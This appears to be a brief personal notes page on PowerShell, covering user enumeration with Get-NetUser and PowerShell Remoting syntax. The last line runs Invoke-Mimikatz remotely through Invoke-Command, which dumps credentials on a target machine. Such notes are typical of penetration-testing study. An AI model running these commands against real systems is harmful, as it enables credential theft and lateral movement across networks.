---
title: powershell
date: 2020-10-20 14:09:14
tags:
---

# PowerShell

select

where

(Get-NetUser | select name).count


## PowerShell Remoting

### One-to-One 

`$sess = New-PSSession -ComputerName <target_name>`
`Enter-PSSession -Session $sess`

### One-to-Many

`Invoke-Command [-ScriptBlock {commands}] [-ComputerName <target_name_FQDN> or <Get-Content comp.txt>] [-FilePath C:\path] [-ArgumentList <args>] [-Credential]`

Load a function from one machine to another

`Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName target.local`